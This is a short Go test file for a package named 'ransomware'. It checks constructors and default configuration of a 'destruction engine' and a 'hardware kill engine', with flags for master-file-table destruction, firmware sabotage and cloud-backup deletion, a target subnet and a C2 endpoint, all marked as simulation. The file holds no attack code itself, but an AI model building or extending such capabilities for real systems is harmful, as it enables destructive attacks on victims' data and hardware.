package ransomware

import (
	"testing"
)

func TestNewDestructionEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	d := NewDestructionEngine(cfg)
	if d == nil {
		t.Fatal("NewDestructionEngine() returned nil")
	}
}

func TestNewHardwareKillEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	h := NewHardwareKillEngine(cfg)
	if h == nil {
		t.Fatal("NewHardwareKillEngine() returned nil")
	}
}

func TestDestructionEngineDefaultState(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	d := NewDestructionEngine(cfg)

	if d == nil {
		t.Fatal("NewDestructionEngine() returned nil")
	}
	if d.config == nil {
		t.Error("DestructionEngine has no config")
	}
}

func TestHardwareKillEngineScan(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	h := NewHardwareKillEngine(cfg)

	vulns := h.CheckFirmwareAccess()
	if len(vulns) == 0 {
		t.Log("CheckFirmwareAccess returned 0 (expected in test env)")
	} else {
		t.Logf("Firmware access: %v", vulns)
	}
}

func TestDestructionConfigFlags(t *testing.T) {
	cfg := DefaultRansomwareConfig()

	if cfg.MFTDestruct {
		t.Log("MFTDestruct enabled (simulation)")
	}
	if cfg.FirmwareSabotage {
		t.Log("FirmwareSabotage enabled (simulation)")
	}
	if cfg.CloudBackupKill {
		t.Log("CloudBackupKill enabled (simulation)")
	}
}

func TestHardwareKillConfig(t *testing.T) {
	cfg := DefaultRansomwareConfig()

	t.Logf("Target subnet: %s", cfg.TargetSubnet)
	t.Logf("C2 endpoint: %s", cfg.C2Endpoint)

	if cfg.TargetSubnet == "" {
		t.Error("TargetSubnet should not be empty in default config")
	}
}
